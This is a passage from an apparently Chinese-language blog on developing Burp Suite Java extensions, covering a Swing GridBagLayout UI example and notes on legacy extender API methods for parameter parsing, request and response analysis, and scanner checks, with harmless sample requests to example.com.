class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>                <span class="hljs-type">JFrame</span> <span class="hljs-variable">frame</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JFrame</span>(<span class="hljs-string">&quot;GridBagLayoutDemo&quot;</span>);<br><br>                <span class="hljs-type">JPanel</span> <span class="hljs-variable">wrapPane</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JPanel</span>();<br>                wrapPane.setLayout(<span class="hljs-keyword">new</span> <span class="hljs-title class_">BoxLayout</span>(wrapPane, BoxLayout.Y_AXIS));<br>                wrapPane.setBorder(<span class="hljs-keyword">new</span> <span class="hljs-title class_">EmptyBorder</span>(<span class="hljs-number">5</span>, <span class="hljs-number">5</span>, <span class="hljs-number">5</span>, <span class="hljs-number">5</span>));<br>                <span class="hljs-type">JScrollPane</span> <span class="hljs-variable">contentPane</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JScrollPane</span>(wrapPane);<br>                contentPane.setHorizontalScrollBarPolicy(ScrollPaneConstants.HORIZONTAL_SCROLLBAR_NEVER);<br>                contentPane.getVerticalScrollBar().setUnitIncrement(<span class="hljs-number">30</span>);<br><br>                <span class="hljs-type">JPanel</span> <span class="hljs-variable">settingPanel</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JPanel</span>();<br>                settingPanel.setLayout(<span class="hljs-keyword">new</span> <span class="hljs-title class_">GridBagLayout</span>());<br>                <span class="hljs-type">GridBagConstraints</span> <span class="hljs-variable">constraints</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">GridBagConstraints</span>();<br>                constraints.anchor = GridBagConstraints.WEST;<br>                constraints.fill = GridBagConstraints.NONE;<br>                constraints.insets = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Insets</span>(<span class="hljs-number">5</span>, <span class="hljs-number">5</span>, <span class="hljs-number">5</span>, <span class="hljs-number">5</span>);<br><br>                <span class="hljs-type">JLabel</span> <span class="hljs-variable">urlLabel</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JLabel</span>(<span class="hljs-string">&quot;URL:&quot;</span>);<br>                constraints.gridx = <span class="hljs-number">0</span>;<br>                constraints.gridy = <span class="hljs-number">0</span>;<br>                settingPanel.add(urlLabel, constraints);<br><br>                <span class="hljs-type">JTextField</span> <span class="hljs-variable">urlField</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JTextField</span>();<br>                constraints.gridx = <span class="hljs-number">1</span>;<br>                constraints.weightx = <span class="hljs-number">1.0</span>;<br>                constraints.fill = GridBagConstraints.HORIZONTAL;<br>                settingPanel.add(urlField, constraints);<br><br>                <span class="hljs-type">JLabel</span> <span class="hljs-variable">apiKeyLabel</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JLabel</span>(<span class="hljs-string">&quot;API KEY:&quot;</span>);<br>                constraints.gridx = <span class="hljs-number">0</span>;<br>                constraints.gridy = <span class="hljs-number">1</span>;<br>                constraints.weightx = <span class="hljs-number">0.0</span>;<br>                settingPanel.add(apiKeyLabel, constraints);<br><br>                <span class="hljs-type">JTextField</span> <span class="hljs-variable">apiKeyField</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JTextField</span>();<br>                constraints.gridx = <span class="hljs-number">1</span>;<br>                constraints.weightx = <span class="hljs-number">1.0</span>;<br>                constraints.fill = GridBagConstraints.HORIZONTAL;<br>                settingPanel.add(apiKeyField, constraints);<br><br>                settingPanel.setAlignmentX(Component.LEFT_ALIGNMENT);<br>                settingPanel.setMaximumSize(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Dimension</span>(<span class="hljs-number">300</span>, settingPanel.getPreferredSize().height));<br>                wrapPane.add(settingPanel);<br><br>                frame.setContentPane(contentPane);<br>                frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);<br>                frame.setSize(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Dimension</span>(<span class="hljs-number">600</span>, <span class="hljs-number">360</span>));<br>                frame.setVisible(<span class="hljs-literal">true</span>);<br>            &#125;<br>        &#125;);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>效果：</p><p><img src="burpsuite-java-extension-ui-6.png" alt="burpsuite-java-extension-ui-6"></p><p>说明：</p><p>每次把组件添加到布局时，传递一个<code>GridBagConstraints</code>对象，在该对象里指定将组件放置在哪一行、哪一列，占几行，占几列，是否沿水平方向伸展等。一些<code>GridBagConstraints</code>对象属性 ：</p><ul><li><p><code>gridx</code>：组件的横坐标，即组件在第几列</p></li><li><p><code>gridy</code>：组件的纵坐标，即组件在第几行</p></li><li><p><code>gridwidth</code>：组件所占列数，即宽度，默认为1</p></li><li><p><code>gridheight</code>：组件所占行数，即高度，默认为1</p></li><li><p><code>fill</code>：当组件在其格内而不能占满其格时，通过<code>fill</code>的值来设定填充方式，有四个可选值：<code>GridBagConstraints.NONE</code>（默认），<code>GridBagConstraints.HORIZONTAL</code>，<code>GridBagConstraints.VERTICAL</code>，<code>GridBagConstraints.BOTH</code>。</p></li><li><p><code>weightx</code>：行的权重，通过这个属性来决定如何分配行的剩余空间，默认为0。</p></li><li><p><code>weighty</code>：列的权重，通过这个属性来决定如何分配列的剩余空间，默认为0。</p></li><li><p><code>anchor</code>：当组件比单元格小时，指定将组件放在单元格的哪个位置。有九个可选值：</p>  <figure class="highlight asciidoc"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asciidoc">FIRST<span class="hljs-emphasis">_LINE_START  PAGE_START  FIRST_LINE_END</span><br><span class="hljs-emphasis">LINE_START        CENTER      LINE_END</span><br><span class="hljs-emphasis">LAST_LINE_START   PAGE_END    LAST_LINE_</span>END<br></code></pre></div></td></tr></table></figure></li><li><p><code>ipadx</code>：组件横向内填充，默认为0。（没用过）</p></li><li><p><code>ipady</code>：组件纵向内填充，默认为0。（没用过）</p></li><li><p><code>insets</code>：组件外填充（没用过）</p></li></ul><p>上面只提到我在开发BP插件时一些常用的布局和方法，灵活运用它们，布局里嵌布局，基本可以实现想要的UI布局。 </p><h2 id="Java-Swing组件"><a href="#Java-Swing组件" class="headerlink" title="Java Swing组件"></a>Java Swing组件</h2><p>Java Swing 组件一览 ： <a href="https://docs.oracle.com/javase/tutorial/uiswing/components/index.html">https://docs.oracle.com/javase/tutorial/uiswing/components/index.html</a> ， 过一遍有什么组件，用到的时候再去看。</p><p>写UI界面基本上就是给组件设置文本、大小，设置监听，但有时候需要丰富组件的功能，如实现一个可以搜索的下拉框，显示Placeholder的文本框，支持撤销重做的文本框等等，可以去问ChatGPT或网上搜搜。如果是再复杂一些的，可能就需要自己实现了。</p><p>附：Burp默认会给组件设置一些样式，如字体，表格颜色，<code>JProgressBar</code>进度条样式（圆角、橙色） 等等。</p><h2 id="灵活操作UI"><a href="#灵活操作UI" class="headerlink" title="灵活操作UI"></a>灵活操作UI</h2><p>Java Swing的UI操作比较灵活，可以有一些”骚操作“，像：</p><ol><li>前段时间我写的小插件 <a href="https://github.com/Ovi3/burp-menu-level">burp-menu-level</a> ，可以修改Burp右键插件菜单的层级。 （可以在BApp Store插件商店里搜 <code>Change Menu Level</code>，点<code>Install</code>安装）</li><li>支持请求编辑框里自动补全Payload的 <a href="https://github.com/synacktiv/HopLa">HopLa</a> 插件。原理：通过注册<code>AWTEventListener</code>监听器，在<code>eventDispatched(AWTEvent event)</code>回调方法里获取<code>JTextArea</code>组件，并给<code>JTextArea</code>组件添加监听。</li><li>支持自定义TAB标题图标的 <a href="https://github.com/irsdl/BurpSuiteSharpenerEx">BurpSuiteSharpenerEx</a> 插件。</li></ol><h2 id="UI参考"><a href="#UI参考" class="headerlink" title="UI参考"></a>UI参考</h2><p>Github上有很多BP插件项目的UI可以参考，这里列几个：</p><ul><li><a href="https://github.com/vaycore/OneScan">OneScan</a> 的请求响应列表页面（类似BurpSuite Proxy页面），配置页面，它用的是 <a href="https://github.com/vaycore/OneScan/tree/v1.5.2/src/main/java/burp/vaycore/common/layout">自定义布局</a></li><li><a href="https://github.com/pmiaowu/BurpShiroPassiveSca">BurpShiroPassiveScan</a> 的请求响应列表页面（类似BurpSuite Proxy页面）</li><li><a href="https://github.com/gh0stkey/HaE">HaE</a> 的可增删改的表格页面</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>Burpsuite</tag>
      
      <tag>Web安全</tag>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Burpsuite Java插件开发 - API篇</title>
    <link href="/2024/01/18/burpsuite-java-extension-api/"/>
    <url>/2024/01/18/burpsuite-java-extension-api/</url>
    
    <content type="html"><![CDATA[<p>网上也有一些BP插件API相关的文章，本文主要就写BP插件API的一些细节，但不会覆盖到所有的API。下方是官方的API文档和示例代码链接。入门BP插件编写，主要就是看官方的几个示例代码，去编译运行，去用用，去查API文档，就差不多了。</p><p>旧API：</p><ul><li>官方文档：<a href="https://portswigger.net/burp/extender">https://portswigger.net/burp/extender</a></li><li>API： <a href="https://portswigger.net/burp/extender/api/index.html">https://portswigger.net/burp/extender/api/index.html</a></li><li>代码示例：<a href="https://github.com/PortSwigger?q=example-&amp;type=all&amp;language=&amp;sort=">https://github.com/PortSwigger?q=example-&amp;type=all&amp;language=&amp;sort=</a></li></ul><p>新API：</p><ul><li>官方文档：<a href="https://portswigger.net/burp/documentation/desktop/extensions/creating">https://portswigger.net/burp/documentation/desktop/extensions/creating</a></li><li>API：<a href="https://portswigger.github.io/burp-extensions-montoya-api/javadoc/index.html（2022年10月，官方出的新API）">https://portswigger.github.io/burp-extensions-montoya-api/javadoc/index.html（2022年10月，官方出的新API）</a></li><li>代码示例：<a href="https://github.com/PortSwigger/burp-extensions-montoya-api-examples">https://github.com/PortSwigger/burp-extensions-montoya-api-examples</a></li></ul><p>BP插件API都出新的了，不过这里还是说旧API，目前网上使用旧API的插件还是比较多的。</p><p>文中的代码主要在 Burpsuite Pro v2023.4.5 版本下测试运行。</p><h3 id="void-IBurpExtenderCallbacks-setExtensionName-java-lang-String-name"><a href="#void-IBurpExtenderCallbacks-setExtensionName-java-lang-String-name" class="headerlink" title="void IBurpExtenderCallbacks.setExtensionName(java.lang.String name)"></a>void IBurpExtenderCallbacks.setExtensionName(java.lang.String name)</h3><p>设置插件名。最好在插件入口一开始就设置。 因为插件名跟插件配置绑定，所以最好不要随意更改插件名。 插件名也被用于插件自己添加的TAB页的标题和右键 - Extensions 菜单显示。</p><h3 id="void-IBurpExtenderCallbacks-customizeUiComponent-java-awt-Component-component"><a href="#void-IBurpExtenderCallbacks-customizeUiComponent-java-awt-Component-component" class="headerlink" title="void IBurpExtenderCallbacks.customizeUiComponent(java.awt.Component component)"></a>void IBurpExtenderCallbacks.customizeUiComponent(java.awt.Component component)</h3><p>将指定的UI组件调整为Burp的UI风格。 </p><p>某些组件调用了这个方法会导致问题 ：</p><ul><li>鼠标不能拖动JTable表格的列头以更换顺序，即使表格调用了<code>table.getTableHeader().setReorderingAllowed(true)</code> 也不行</li><li><code>JComboBox</code>下拉框不能编辑，即使设置了<code>Editable</code>为<code>true</code>。</li></ul><p>解决方式：</p><ul><li>先调用<code>customizeUiComponent</code>方法，再修改组件（比如将<code>JComboBox</code>组件的<code>Editable</code>为<code>true</code>）。</li><li>不要调用<code>customizeUiComponent</code>方法，实际测试调不调用这个方法对界面外观没有什么影响。（所以这个方法是做了什么操作？没去细究）</li></ul><h3 id="void-IBurpExtenderCallbacks-addScanIssue-IScanIssue-issue"><a href="#void-IBurpExtenderCallbacks-addScanIssue-IScanIssue-issue" class="headerlink" title="void IBurpExtenderCallbacks.addScanIssue(IScanIssue issue)"></a>void IBurpExtenderCallbacks.addScanIssue(IScanIssue issue)</h3><p>将<code>Issue</code>添加到<code>Burpsuite</code>的<code>Dashboard</code>。</p><p>需自己编写一个实现<code>IScanIssue</code>接口的类。无论该类的<code>getIssueType()</code>方法返回什么值，由<code>IScannerListener</code>监听拿到的<code>issue</code>对象的<code>issueType</code>固定是 <code>0x08000000</code>，表示是由插件添加的<code>issue</code>。<code>IssueType</code>列表见：<a href="https://portswigger.net/kb/issues">https://portswigger.net/kb/issues</a> 或 打开 <code>bupsuite - Target - Issue definitions</code>查看。</p><h2 id="byte-IExtensionHelpers-updateParameter-byte-request-IParameter-parameter"><a href="#byte-IExtensionHelpers-updateParameter-byte-request-IParameter-parameter" class="headerlink" title="byte[] IExtensionHelpers.updateParameter(byte[] request, IParameter parameter)"></a>byte[] IExtensionHelpers.updateParameter(byte[] request, IParameter parameter)</h2><p>更新HTTP请求中参数的值。如果更新了请求body，还会添加或更新Content-Length请求头。</p><p>该方法不会自动对参数值编码。且仅支持<code>IParameter.PARAM_URL</code>, <code>IParameter.PARAM_BODY</code> 和 <code>IParameter.PARAM_COOKIE</code>类型的<code>IParameter</code>对象，传递其他类型的<code>IParameter</code>对象会抛异常。</p><p>示例：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> burp;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BurpExtender</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IBurpExtender</span><br>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">registerExtenderCallbacks</span><span class="hljs-params">(IBurpExtenderCallbacks callbacks)</span><br>    &#123;<br>        callbacks.setExtensionName(<span class="hljs-string">&quot;Test Extension&quot;</span>);<br><br>        <span class="hljs-type">IExtensionHelpers</span> <span class="hljs-variable">helpers</span> <span class="hljs-operator">=</span> callbacks.getHelpers();<br>        <span class="hljs-type">IParameter</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> helpers.buildParameter(<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;1&amp;b=2&quot;</span>, IParameter.PARAM_BODY);<br>        <span class="hljs-type">byte</span>[] request = <span class="hljs-string">&quot;POST / HTTP/1.1\r\nHost: example.com\r\n\r\nc=3&quot;</span>.getBytes();<br>        <span class="hljs-type">byte</span>[] request2 = helpers.updateParameter(request, a);<br>        callbacks.printOutput(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(request2));<br><br>    &#125;<br><br>&#125;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">输出：</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">POST / HTTP/1.1</span><br><span class="hljs-comment">Host: example.com</span><br><span class="hljs-comment">Content-Length: 11</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">c=3&amp;a=1&amp;b=2</span><br><span class="hljs-comment">*/</span><br></code></pre></div></td></tr></table></figure><h2 id="void-IExtensionStateListener-extensionUnloaded"><a href="#void-IExtensionStateListener-extensionUnloaded" class="headerlink" title="void IExtensionStateListener.extensionUnloaded()"></a>void IExtensionStateListener.extensionUnloaded()</h2><p>该回调方法在卸载（unload）插件时被调用，关闭Burp时不会被调用。</p><p>通常在这个回调方法里关闭插件里启动的后台线程和连接、文件资源等，不然线程还会继续运行，容易造成问题。</p><h2 id="IRequestInfo"><a href="#IRequestInfo" class="headerlink" title="IRequestInfo"></a>IRequestInfo</h2><p>调用<code>IExtensionHelpers</code>对象的<code>IRequestInfo analyzeRequest(byte[] request)</code>方法解析请求数据，返回<code>IRequestInfo</code>对象，该对象包含一些请求信息，如请求头，参数列表等。<code>IRequestInfo</code>对象的几个方法的细节：</p><ul><li><p><code>java.util.List&lt;IParameter&gt; IRequestInfo.getParameters()</code>：返回请求包里的参数列表。burp支持解析的参数类型有URL query参数、Cookie、body里的urlencoded格式、json格式、xml格式或multipart格式的参数。对于multipart格式请求包的解析结果需要说明下，以下示例代码：</p>  <figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> burp;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BurpExtender</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IBurpExtender</span><br>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">registerExtenderCallbacks</span><span class="hljs-params">(IBurpExtenderCallbacks callbacks)</span><br>    &#123;<br>        callbacks.setExtensionName(<span class="hljs-string">&quot;Test Extension&quot;</span>);<br><br>        <span class="hljs-type">IExtensionHelpers</span> <span class="hljs-variable">helpers</span> <span class="hljs-operator">=</span> callbacks.getHelpers();<br>        <span class="hljs-type">byte</span>[] request = (<span class="hljs-string">&quot;POST / HTTP/1.1\r\n&quot;</span> +<br>                <span class="hljs-string">&quot;Host: example.org\r\n&quot;</span> +<br>                <span class="hljs-string">&quot;Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryxUcPkAgfQy8GyoF5\r\n&quot;</span> +<br>                <span class="hljs-string">&quot;Content-Length: 259\r\n&quot;</span> +<br>                <span class="hljs-string">&quot;\r\n&quot;</span> +<br>                <span class="hljs-string">&quot;------WebKitFormBoundaryxUcPkAgfQy8GyoF5\r\n&quot;</span> +<br>                <span class="hljs-string">&quot;Content-Disposition: form-data; name=\&quot;note\&quot;;\r\n&quot;</span> +<br>                <span class="hljs-string">&quot;\r\n&quot;</span> +<br>                <span class="hljs-string">&quot;test\r\n&quot;</span> +<br>                <span class="hljs-string">&quot;------WebKitFormBoundaryxUcPkAgfQy8GyoF5\r\n&quot;</span> +<br>                <span class="hljs-string">&quot;Content-Disposition: form-data; name=\&quot;file\&quot;; filename=\&quot;test.txt\&quot;\r\n&quot;</span> +<br>                <span class="hljs-string">&quot;\r\n&quot;</span> +<br>                <span class="hljs-string">&quot;content\r\n&quot;</span> +<br>                <span class="hljs-string">&quot;------WebKitFormBoundaryxUcPkAgfQy8GyoF5--\r\n&quot;</span>).getBytes();<br>        <span class="hljs-type">IRequestInfo</span> <span class="hljs-variable">requestInfo</span> <span class="hljs-operator">=</span> helpers.analyzeRequest(request);<br>        <span class="hljs-keyword">for</span>(IParameter parameter: requestInfo.getParameters()) &#123;<br>            callbacks.printOutput(String.valueOf(parameter.getType()));<br>            callbacks.printOutput(parameter.getName());<br>            callbacks.printOutput(parameter.getValue());<br>            callbacks.printOutput(<span class="hljs-string">&quot;---------------------&quot;</span>);<br>        &#125;<br><br>    &#125;<br><br>&#125;<br></code></pre></div></td></tr></table></figure><p>  输出：</p>  <figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-number">1</span>  <span class="hljs-comment">// 即 IParameter.PARAM_BODY</span><br>note<br>test<br>---------------------<br><span class="hljs-number">5</span>  <span class="hljs-comment">// 即 IParameter.PARAM_MULTIPART_ATTR</span><br>filename<br>test.txt<br>---------------------<br><span class="hljs-number">1</span>  <span class="hljs-comment">// 即 IParameter.PARAM_BODY</span><br>file<br>content<br>---------------------<br></code></pre></div></td></tr></table></figure><p>  <code>IParameter.PARAM_MULTIPART_ATTR</code>类型的参数，指multipart属性，即这里的<code>filename=&quot;test.txt&quot;</code>部分，而body里的其他参数归于<code>IParameter.PARAM_BODY</code>这类。body里的urlencoded格式参数也是<code>IParameter.PARAM_BODY</code>。</p><p>  另外对于xml这种<code>&lt;empty/&gt;</code>空元素不解析，但解析<code>&lt;empty&gt;&lt;/empty&gt;</code>这种，类型为<code>IParameter.PARAM_XML</code>。</p></li><li><p><code>java.util.List&lt;java.lang.String&gt; IRequestInfo.getHeaders()</code>：获取请求头列表，包含请求体第一行（如：<code>GET / HTTP/1.1</code>）</p></li><li><p><code>byte IRequestInfo.getContentType()</code>： 返回body的Content Type。其不是根据<code>Content-Type</code>请求头判断，而是根据body内容来判断：</p>  <figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> burp;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BurpExtender</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IBurpExtender</span><br>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">registerExtenderCallbacks</span><span class="hljs-params">(IBurpExtenderCallbacks callbacks)</span><br>    &#123;<br>        callbacks.setExtensionName(<span class="hljs-string">&quot;Test Extension&quot;</span>);<br><br>        <span class="hljs-type">IExtensionHelpers</span> <span class="hljs-variable">helpers</span> <span class="hljs-operator">=</span> callbacks.getHelpers();<br>        <span class="hljs-type">byte</span>[] request = <span class="hljs-string">&quot;POST / HTTP/1.1\r\nHost: test.com\r\nContent-Type: application/json\r\n\r\n&lt;user&gt;admin&lt;/user&gt;&quot;</span>.getBytes();<br>        <span class="hljs-type">IRequestInfo</span> <span class="hljs-variable">requestInfo</span> <span class="hljs-operator">=</span> helpers.analyzeRequest(request);<br>        callbacks.printOutput(<span class="hljs-string">&quot;ct: &quot;</span> + requestInfo.getContentType());<br>    &#125;<br><br>&#125;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">输出：</span><br><span class="hljs-comment">3          // 即 IRequestInfo.CONTENT_TYPE_XML</span><br><span class="hljs-comment">*/</span><br></code></pre></div></td></tr></table></figure></li></ul><h2 id="IResponseInfo"><a href="#IResponseInfo" class="headerlink" title="IResponseInfo"></a>IResponseInfo</h2><p>调用<code>IExtensionHelpers</code>对象的<code>IResponseInfo analyzeResponse(byte[] response)</code>方法解析请求数据，返回<code>IResponseInfo</code>对象，该对象包含一些响应信息，如状态码，响应头，MIME类型等。</p><p><code>IResponseInfo</code>对象获取MIME类型有两个方法：</p><ul><li><code>java.lang.String IResponseInfo.getStatedMimeType()</code>：根据<code>Content-Type</code>响应头返回MIME类型</li><li><code>java.lang.String IResponseInfo.getInferredMimeType()</code>：根据body内容判断MIME类型。 （在Burp的<code>Proxy</code>面板的MIME列就是根据body内容判断的）</li></ul><p>返回值可能是<code>HTML</code>、<code>GIF</code>、<code>SVG</code>、<code>image</code>、<code>PNG</code>、<code>JPEG</code>、<code>CSS</code>、<code>JSON</code>、<code>XML</code>、<code>script</code>、<code>video</code> 或空字符串等。</p><h2 id="IParameter"><a href="#IParameter" class="headerlink" title="IParameter"></a>IParameter</h2><p>上面提到通过解析请求数据，获取请求参数列表，即<code>IParameter</code>对象列表。通过<code>IParameter</code>对象的<code>getValue()</code>方法可以获取到参数值，需要注意的是，获取到的值为未解码过的。示例：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> burp;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BurpExtender</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IBurpExtender</span><br>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">registerExtenderCallbacks</span><span class="hljs-params">(IBurpExtenderCallbacks callbacks)</span><br>    &#123;<br>        callbacks.setExtensionName(<span class="hljs-string">&quot;Test Extension&quot;</span>);<br><br>        <span class="hljs-type">IExtensionHelpers</span> <span class="hljs-variable">helpers</span> <span class="hljs-operator">=</span> callbacks.getHelpers();<br>        <span class="hljs-type">byte</span>[] request = <span class="hljs-string">&quot;POST /redirect?url=http:%2f%2f HTTP/1.1\r\nHost: test.com\r\nContent-Type: application/json\r\n\r\n&#123;\&quot;username\&quot;:\&quot;admin\&quot;,\&quot;remember\&quot;:1&#125;&quot;</span>.getBytes();<br>        <span class="hljs-type">IRequestInfo</span> <span class="hljs-variable">requestInfo</span> <span class="hljs-operator">=</span> helpers.analyzeRequest(request);<br>        <span class="hljs-keyword">for</span>(IParameter parameter: requestInfo.getParameters()) &#123;<br>            callbacks.printOutput(String.valueOf(parameter.getType()));<br>            callbacks.printOutput(parameter.getName());<br>            callbacks.printOutput(parameter.getValue());<br>            callbacks.printOutput(<span class="hljs-string">&quot;---------------------&quot;</span>);<br>        &#125;<br>    &#125;<br><br>&#125;<br></code></pre></div></td></tr></table></figure><p>输出：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-number">0</span><br>url<br>http:%<span class="hljs-number">2f</span>%<span class="hljs-number">2f</span><br>---------------------<br><span class="hljs-number">6</span><br>username<br>admin<br>---------------------<br><span class="hljs-number">6</span><br>remember<br><span class="hljs-number">1</span><br>---------------------<br></code></pre></div></td></tr></table></figure><p>上方的query参数<code>/?url=http:%2f%2f</code>，拿到的值是<code>http:%2f%2f</code>，burp没有对其进行解码，在数据包里什么样就是什么样。</p><p>对于JSON参数 <code>&#123;&quot;usernmae&quot;: &quot;admin&quot;, &quot;rememberme&quot;: 1&#125;</code>的<code>&quot;admin&quot;</code>和<code>1</code>参数值，<code>getValue()</code>返回值分别是<code>admin</code>和<code>1</code>，并不能从值去判断该JSON参数是字符串还是数字，可以使用<code>request[parameter.getValueStart()-1] == &#39;&quot;&#39;</code> 来判断。</p><h2 id="IScannerCheck"><a href="#IScannerCheck" class="headerlink" title="IScannerCheck"></a>IScannerCheck</h2><p>通过 <code>IBurpExtenderCallbacks</code>对象的<code>registerScannerCheck(IScannerCheck check)</code> 方法注册一个<code>IScannerCheck</code>对象来向burp添加自己的扫描检测。</p><p><code>IScannerCheck</code>接口的几个方法：</p><ul><li><code>int consolidateDuplicateIssues(IScanIssue existingIssue, IScanIssue newIssue)</code>：当同一个URL路径报了多个issue，该方法就会被调用。若返回<code>-1</code>则只报告<code>existingIssue</code>，若返回<code>0</code>则报告这两个<code>issue</code>，若返回1则报告<code>newIssue</code>。通常返回<code>0</code>。</li><li><code>java.util.List&lt;IScanIssue&gt; doActiveScan(IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint)</code>：主动扫描时被调用，需要时可在此方法里发包。 返回值为issue列表，其会被加到Burp的Dashboard的<code>Issue Activity</code>面板里。（也可以直接返回空列表，然后通过调用 <code>IBurpExtenderCallbacks.addScanIssue(IScanIssue issue)</code> 